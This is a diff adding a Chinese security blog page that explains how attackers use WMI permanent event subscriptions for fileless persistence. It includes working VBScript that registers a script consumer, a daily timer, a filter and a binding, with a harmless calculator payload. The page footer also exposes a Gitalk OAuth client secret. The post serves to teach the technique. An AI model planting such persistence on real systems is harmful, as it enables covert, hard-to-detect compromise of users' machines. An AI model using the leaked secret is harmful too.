@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cxvhacker.github.io","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一种利用WMI来存储并定时执行的无文件攻击技术。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用WMI实现无文件攻击">
+<meta property="og:url" content="https://cxvhacker.github.io/2020/01/22/zhangtaiming/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="辰信安全基地">
+<meta property="og:description" content="一种利用WMI来存储并定时执行的无文件攻击技术。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cxvhacker.github.io/pic/zhangtaiming/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/tool.png">
+<meta property="article:published_time" content="2020-01-22T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-01T10:13:39.013Z">
+<meta property="article:author" content="vhacker">
+<meta property="article:tag" content="WMI">
+<meta property="article:tag" content="无文件攻击">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cxvhacker.github.io/pic/zhangtaiming/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/tool.png">
+
+<link rel="canonical" href="https://cxvhacker.github.io/2020/01/22/zhangtaiming/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>利用WMI实现无文件攻击 | 辰信安全基地</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">辰信安全基地</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">严肃工作  活泼生活</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cxvhacker.github.io/2020/01/22/zhangtaiming/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="vhacker">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="辰信安全基地">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          利用WMI实现无文件攻击
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-22 00:00:00" itemprop="dateCreated datePublished" datetime="2020-01-22T00:00:00+00:00">2020-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-01 10:13:39" itemprop="dateModified" datetime="2021-02-01T10:13:39+00:00">2021-02-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WMI/" itemprop="url" rel="index"><span itemprop="name">WMI</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WMI/St/" itemprop="url" rel="index"><span itemprop="name">St</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    无文件攻击无需落地到目标的磁盘，因此反病毒引擎一般很难检测。WMI以本地和远程方式提供了许多管理功能，包括查询系统信息、启动和停止进程以及设置条件触发器。病毒可以利用WMI来存储并定时执行恶意代码，来实现无文件攻击。</p>
+<h1 id="WMI简介"><a href="#WMI简介" class="headerlink" title="WMI简介"></a>WMI简介</h1><p>​    WMI是从Windows 2000起，在每个Windows系统版本中都会内置的一个管理框架。WMI以本地和远程方式提供了许多管理功能，包括查询系统信息、启动和停止进程以及设置条件触发器。我们可以使用各种工具（比如Windows的WMI命令行工具wmic.exe）或者脚本编程语言（如PowerShell）提供的API接口来访问WMI。Windows系统的WMI数据存储在WMI公共信息模型（common information model，CMI）仓库中，该仓库由“System32wbemRepository”文件夹中的多个文件组成。</p>
+<p>​    WMI类是WMI的主要结构。WMI类中可以包含方法（代码）以及属性（数据）。具有系统权限的用户可以自定义类或扩展许多默认类的功能。</p>
+<p>​    在满足特定条件时，我们可以使用WMI永久事件订阅（permanent event subscriptions）机制来触发特定操作。攻击者经常利用这个功能，在系统启动时执行后门程序，完成本地持久化。WMI的事件订阅包含三个核心WMI类：Filter（过滤器）类、Consumer（消费者）类以及FilterToConsumerBinding类。WMI Consumer用来指定要执行的具体操作，包括执行命令、运行脚本、添加日志条目或者发送邮件。WMI Filter用来定义触发Consumer的具体条件，包括系统启动、特定程序执行、特定时间间隔以及其他条件。FilterToConsumerBinding用来将Consumer与Filter关联在一起。创建一个WMI永久事件订阅需要系统的管理员权限。</p>
+<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><p>​    下面利用WMI中的永久时间消费者ActiveScriptEventConsumer，来实现无文件攻击。WMI中有许多这类的时间消费者，简单来说，当与其绑定的时间达到时，消费者就会被触发执行预先定义好的功能。</p>
+<p>​    ASEC是WMI中的一个标准永久事件消费者，他的作用是当与其绑定的一个事件达到时，可以执行预先设定好的JS/VBS脚本。先来看下其原型：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ActiveScriptEventConsumer</span> :</span> __EventConsumer</span><br><span class="line">&#123;</span><br><span class="line">  uint8  CreatorSID[] = &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">18</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;<span class="comment">//表示安全标识符（SID）的数组，该标识符唯一地标识活动脚本事件使用者的创建者。只读</span></span><br><span class="line">  uint32 KillTimeout = <span class="number">0</span>;<span class="comment">//允许脚本运行的事件，如果为0，则脚本不会终止。</span></span><br><span class="line">  <span class="built_in">string</span> MachineName;<span class="comment">//WMI向其发送事件的计算机的名称。按照Microsoft标准使用者的约定，脚本使用者不能远程运行。第三方消费者也可以使用此属性。</span></span><br><span class="line">  uint32 MaximumQueueSize;<span class="comment">//活动脚本事件使用者的最大队列</span></span><br><span class="line">  <span class="built_in">string</span> Name;<span class="comment">//用户自定义的事件消费者名称</span></span><br><span class="line">  <span class="built_in">string</span> ScriptingEngine;<span class="comment">//用于解释脚本的脚本引擎，这里用的是VBScript</span></span><br><span class="line">  <span class="built_in">string</span> ScriptFileName;<span class="comment">//想要从一个文件中读取执行脚本时，使用这个。</span></span><br><span class="line">  <span class="built_in">string</span> ScriptText;<span class="comment">//存放执行的脚本代码，与ScriptFileName不可同时使用。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    下面是一个绑定时间和ASEC的实例。</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">'配置时间消费者 用于指定要执行的具体操作</span></span><br><span class="line">nslink=<span class="string">"winmgmts:\\.\root\subscription:"</span>	<span class="comment">'设置ASEC所在的名称空间</span></span><br><span class="line"><span class="keyword">SET</span> asec=<span class="built_in">getobject</span>(nslink&amp;<span class="string">"ActiveScriptEventConsumer"</span>).spawninstance_</span><br><span class="line">asec.name=<span class="string">"test_consumer"</span>	<span class="comment">'自定义消费者名称</span></span><br><span class="line">asec.scriptingengine=<span class="string">"vbscript"</span>	<span class="comment">'用于解释脚本的脚本引擎</span></span><br><span class="line">stxt=<span class="string">"CreateObject(""Wscript.Shell"").Run ""calc"",3"</span>	<span class="comment">'脚本代码 这里会弹出一个计算器</span></span><br><span class="line">asec.scripttext=stxt</span><br><span class="line"><span class="keyword">SET</span> asecpath=asec.put_</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">'配置计时器</span></span><br><span class="line"><span class="keyword">SET</span> itimer=<span class="built_in">getobject</span>(nslink&amp;<span class="string">"__IntervalTimerInstruction"</span>).spawninstance_</span><br><span class="line">itimer.timerid=<span class="string">"test_itimer"</span>	<span class="comment">'自定义计时器名称</span></span><br><span class="line">runinterval = <span class="number">86400000</span> </span><br><span class="line">itimer.intervalbetweenevents=runinterval	<span class="comment">'自定义脚本运行间隔 这里是一天运行一次。这里如果设置的时间过短 WMI会自动忽略</span></span><br><span class="line">itimer.skipifpassed=<span class="literal">false</span></span><br><span class="line">itimer.put_</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">'配置事件过滤器 用于定义触发条件</span></span><br><span class="line"><span class="keyword">SET</span> evtflt=<span class="built_in">getobject</span>(nslink&amp;<span class="string">"__EventFilter"</span>).spawninstance_</span><br><span class="line">evtflt.name=<span class="string">"test_filter"</span>	</span><br><span class="line">evtflt.query=<span class="string">"select * from __timerevent where timerid="""</span>&amp;<span class="string">"test_itimer"""</span>	</span><br><span class="line">evtflt.querylanguage=<span class="string">"wql"</span>	<span class="comment">'使用WQL（WMI Query Language）语言查询事件是否触发</span></span><br><span class="line"><span class="keyword">SET</span> fltpath=evtflt.put_</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">'绑定消费者和过滤器</span></span><br><span class="line"><span class="keyword">SET</span> fcbnd=<span class="built_in">getobject</span>(nslink&amp;<span class="string">"__FilterToConsumerBinding"</span>).spawninstance_</span><br><span class="line">fcbnd.consumer=asecpath.path</span><br><span class="line">fcbnd.<span class="built_in">filter</span>=fltpath.path</span><br><span class="line">fcbnd.put_</span><br></pre></td></tr></table></figure>
+
+<p>​    将上述代码保存到vbs文件中运行，然后通过wmi查看工具来查询是否设置成功，这里用的工具是SimpleWMIView。</p>
+<p><img src="/pic/zhangtaiming/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/tool.png" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    之前著名的POSHSPY后门就是利用这一技术来实现的，他利用WMI实现后门的存储和本地持久化，不熟悉WMI的人难以发现其踪影。</p>
+<p>​    不过，该技术依然存在弊端，脚本运行时，由系统自带的srcons.exe作为脚本宿主，这就会增加一个系统进程，虽然是系统正常的进程，不会被杀毒软件查杀，但还是太显眼了。并且，脚本运行结束后，该进程不会自动结束，必须让脚本借助WMI提供的Win32_Process对象主动终止宿主进程。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>St
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://cxvhacker.github.io/2020/01/22/zhangtaiming/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/%E5%88%A9%E7%94%A8WMI%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/" title="利用WMI实现无文件攻击">https://cxvhacker.github.io/2020/01/22/zhangtaiming/利用WMI实现无文件攻击/利用WMI实现无文件攻击/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WMI/" rel="tag"># WMI</a>
+              <a href="/tags/%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/" rel="tag"># 无文件攻击</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/05/iab/DTLMiner_1/" rel="next" title="驱动人生木马(DTLMiner)样本分析">
+      驱动人生木马(DTLMiner)样本分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WMI简介"><span class="nav-number">2.</span> <span class="nav-text">WMI简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实现过程"><span class="nav-number">3.</span> <span class="nav-text">实现过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">vhacker</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">vhacker</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '399537cdb54292e355a4',
+      clientSecret: '1d1c2f5009f3f64de8bdb96fe07481045f835d06',
+      repo        : 'cxvhacker.github.io',
+      owner       : 'cxvhacker',
+      admin       : ['cxvhacker'],
+      id          : '4e9a002e662db508427556f576902755',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
